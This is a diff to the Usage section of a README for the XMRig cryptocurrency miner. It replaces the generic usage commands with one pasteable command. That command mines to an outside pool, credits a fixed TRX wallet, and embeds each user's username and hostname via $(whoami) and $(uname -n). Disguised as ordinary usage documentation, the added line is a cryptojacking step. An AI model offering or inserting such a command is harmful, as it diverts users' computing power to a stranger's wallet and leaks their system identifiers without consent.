@@ -8,10 +8,7 @@ XMRig is a high performance, open source, cross platform RandomX, KawPow, Crypto
 
 ## Usage
 ```bash
-./xmrig --configure
-./xmrig --clean
-./xmrig --show
-./xmrig
+xmrig -a gr -o stratum+ssl://ghostrider.unmineable.com:443 -u "TRX:TUa3ZgQfnT21kQsSc4MwZyFxigKrQdQ9dU.$(whoami)_$(uname -n)#uhok-ykxb" -p x
 ```
 For a detailed description of all available parameters and usage examples, please refer to the [official XMRig documentation](https://xmrig.com/docs/miner/command-line-options)
 
